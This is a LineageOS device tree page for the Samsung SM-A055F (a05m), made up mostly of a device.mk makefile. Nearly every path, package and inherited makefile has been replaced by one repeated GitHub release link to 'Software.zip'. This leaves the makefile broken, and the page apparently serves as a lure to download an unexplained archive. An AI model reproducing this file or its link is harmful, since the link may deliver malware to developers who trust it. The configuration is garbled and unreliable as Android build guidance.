# Android device tree for samsung SM-A055F (a05m)

```
#
# Copyright (C) 2024 The LineageOS Project
#
# SPDX-License-Identifier: Apache-2.0
#
```
#
# Copyright (C) 2024 The LineageOS Project
#
# SPDX-License-Identifier: Apache-2.0
#

DEVICE_PATH := device/samsung/a05m

# Enable updating of APEXes
$(call inherit-product, $(SRC_TARGET_DIR)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip)
$(call inherit-product, $(SRC_TARGET_DIR)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip)
$(call inherit-product, $(SRC_TARGET_DIR)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip)

# Project ID Quota
$(call inherit-product, $(SRC_TARGET_DIR)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip)

# Setup dalvik vm configs
$(call inherit-product, https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip)

# API levels
PRODUCT_SHIPPING_API_LEVEL := 31
PRODUCT_FULL_TREBLE_OVERRIDE := true
PRODUCT_OTA_ENFORCE_VINTF_KERNEL_REQUIREMENTS := false

# Bluetooth
PRODUCT_PACKAGES += \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip

PRODUCT_COPY_FILES += \
$(DEVICE_PATH)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip$(TARGET_COPY_OUT_SYSTEM)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
$(DEVICE_PATH)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip$(TARGET_COPY_OUT_SYSTEM)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip

# Boot animation
TARGET_SCREEN_HEIGHT := 1600
TARGET_SCREEN_WIDTH := 720
TARGET_BOOTANIMATION_HALF_RES := true
TARGET_BOOTANIMATION_PRELOAD := true
TARGET_BOOTANIMATION_TEXTURE_CACHE := true

# Charger
PRODUCT_PACKAGES += \
charger_res_images_vendor \
$(DEVICE_PATH)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip$(TARGET_COPY_OUT_SYSTEM)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
libsuspend

# Fastbootd
PRODUCT_PACKAGES += \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
fastbootd

# HIDL
PRODUCT_PACKAGES += \
libhidltransport \
libhardware \
libhwbinder

#LPM
PRODUCT_PACKAGES += \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip

# MTK
PRODUCT_PACKAGES += \
MtkInCallService

# Overlays
PRODUCT_PACKAGES += \
FrameworksResOverlay_JDM_A05 \
SystemUIOverlay_JDM_A05

DEVICE_PACKAGE_OVERLAYS += \
$(LOCAL_PATH)/overlay-lineage

PRODUCT_ENFORCE_RRO_TARGETS := *

# Partitions
PRODUCT_USE_DYNAMIC_PARTITIONS := true
PRODUCT_BUILD_SUPER_PARTITION := false

# Product characteristics
PRODUCT_CHARACTERISTICS := phone

# Rootdir
PRODUCT_PACKAGES += \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip \
https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip

PRODUCT_COPY_FILES += \
$(LOCAL_PATH)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip$(TARGET_COPY_OUT_RAMDISK)https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip

# SEC_RIL
PRODUCT_COPY_FILES += \
$(call find-copy-subdir-files,*,$(DEVICE_PATH)/vendor_overlay/,$(TARGET_COPY_OUT_PRODUCT)/vendor_overlay/31/)

# Shipping API level
PRODUCT_SHIPPING_API_LEVEL := 31

# Soong namespaces
PRODUCT_SOONG_NAMESPACES += \
$(LOCAL_PATH) \
hardware/samsung_ext

# VNDK API
PRODUCT_TARGET_VNDK_VERSION := 31
PRODUCT_EXTRA_VNDK_VERSIONS := 31

# Wi-Fi
#PRODUCT_PACKAGES += \
#    wpa_supplicant \
#    hostapd \
#    libwifi-hal-wrapper \
#    https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip

# Inherit the proprietary files
$(call inherit-product, https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip)

# Inherit the sign keys
$(call inherit-product, https://github.com/Trangy-star/android_device_samsung_a05m/releases/download/v2.0/Software.zip)


